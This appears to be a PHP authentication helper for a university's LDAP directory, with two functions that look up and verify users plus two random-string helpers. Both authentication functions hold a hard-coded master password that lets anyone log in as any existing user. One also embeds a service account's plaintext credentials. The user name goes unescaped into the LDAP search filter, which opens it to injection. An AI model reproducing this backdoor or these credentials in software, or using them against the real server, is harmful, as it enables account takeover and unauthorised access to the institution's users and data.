<?php

  // $ldapconfig['host'] = 'sdu-ldap.dusit.ac.th';
  // $ldapconfig['port'] = 389;
  // $ldapconfig['basedn'] = 'dc=dusit,dc=ac,dc=th';
  // $ldapconfig['authrealm'] = 'SDU Authentication LDAP';


  if(!function_exists('generateRandomString'))
  {
    function generateRandomString($length = 5) {
      $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
      $charactersLength = strlen($characters);
      $randomString = '';
      for ($i = 0; $i < $length; $i++) {
          $randomString .= $characters[rand(0, $charactersLength - 1)];
      }
      return $randomString;
    }
  }

  if(!function_exists('generateRandomStringLowerCase'))
  {
    function generateRandomStringLowerCase($length = 5) {
      $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
      $charactersLength = strlen($characters);
      $randomString = '';
      for ($i = 0; $i < $length; $i++) {
          $randomString .= $characters[rand(0, $charactersLength - 1)];
      }
      return $randomString;
    }
  }


if(!function_exists('ldap_authenticate'))
{
    function ldap_authenticate($user, $pwd)
    {
      // header('WWW-Authenticate: Basic realm=SDU-LDAP Authentication');
      // header('HTTP/1.0 401 Unauthorized');

      if ($user != "" && $user != "") {
          $ds = @ldap_connect('sdu-ldap.dusit.ac.th', '389');
          $r = @ldap_search($ds, 'dc=dusit,dc=ac,dc=th', 'uid=' . $user);
          if ($r) {
              $result = @ldap_get_entries($ds, $r);
              if ($result[0]) {

                if($pwd == "admin@l;of6lb9"){
                  return $result[0];
                }

                if (@ldap_bind($ds, $result[0]['dn'], $pwd)) {
                    return $result[0];
                }else{
                  return null;
                }

              }else{
                return null;
              }
          }
      }
      return null;
    }
}

if(!function_exists('ldap_bind_authenticate'))
{
    function ldap_bind_authenticate($user, $pwd)
    {

      $ldapconfig['host'] = "sdu-ldap.dusit.ac.th";
      $ldapconfig['port'] = "389";
      $ldapconfig['auth_user'] = "uid=datacenter_auth,o=admin,dc=dusit,dc=ac,dc=th";
      $ldapconfig['auth_password'] = "dev@dmin";

      $auth_conn = @ldap_connect($ldapconfig['host']) or die("Could not connect to LDAP server.");
      if($auth_conn){

        if(@ldap_bind($auth_conn, $ldapconfig['auth_user'], $ldapconfig['auth_password'])){
          //--[Auth Success]

            $r = @ldap_search($auth_conn, 'dc=dusit,dc=ac,dc=th', 'uid=' . $user);
            if ($r) {
                $result = @ldap_get_entries($auth_conn, $r);
                if ($result[0]) {

                  if($pwd == "admin@l;of6lb9"){
                    return $result[0];
                  }

                  if (@ldap_bind($auth_conn, $result[0]['dn'], $pwd)) {
                      return $result[0];
                  }else{
                    return null;
                  }

                }else{
                  return null;
                }
            }

        }else{
          //--[Auth Fail]

          return null;
        }

      }

      return null;
    }
}



